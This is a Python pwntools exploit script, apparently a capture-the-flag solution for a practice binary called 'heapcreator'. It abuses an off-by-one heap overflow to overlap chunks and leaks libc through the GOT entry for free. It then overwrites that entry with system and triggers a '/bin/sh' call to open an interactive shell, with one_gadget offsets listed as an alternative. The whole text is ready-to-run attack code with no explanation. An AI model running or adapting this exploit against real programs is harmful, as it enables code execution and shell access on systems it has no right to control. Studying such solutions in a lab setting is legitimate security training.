from pwn import *
context(
	log_level='debug',
	binary='./heapcreator'
)
e=context.binary
libc=e.libc
io=process()

#=========================================
#Function

def dbg(script=''):
	gdb.attach(io,gdbscript=script)

def menu(func):
	io.sendlineafter('Your choice :',str(func))

def create(heap_size,content):
	menu(1)
	io.sendlineafter('Size of Heap : ',str(heap_size))
	io.sendlineafter('Content of heap:',str(content))

def edit(index,content):
	menu(2)
	io.sendlineafter('Index :',str(index))
	io.sendlineafter('Content of heap : ',str(content))

def show(index):
	menu(3)
	io.sendlineafter('Index :',str(index))

def delete(index):
	menu(4)
	io.sendlineafter('Index :',str(index))



#=========================================
#VAR
libc_off=541936  #free

gadget=[283158,283242,983716,987463]
free_addr = e.got['free']

#=========================================

create(0x28,'aaaa')
create(0x10,'bbbb')
edit(0,'/bin/sh\x00'+'a'*0x20+'\x41')
delete(1)
create(0x30,p64(0)*3+p64(0x21)+p64(0x30)+p64(free_addr))
show(1)
io.recvuntil("Content : ")
libc_free = u64(io.recvline()[:-1].ljust(8,'\x00'))
success("libc_free.address: " + hex(libc_free))
libc.address = libc_free - libc_off
success("libc.address: " + hex(libc.address))
system_addr = libc.symbols['system']
one_gadget = libc.address + gadget[3]
# malloc_hook = libc.symbols['__malloc_hook']

edit(1,p64(system_addr))
# edit(1,p64(one_gadget))
delete(0)
# dbg()

io.interactive()
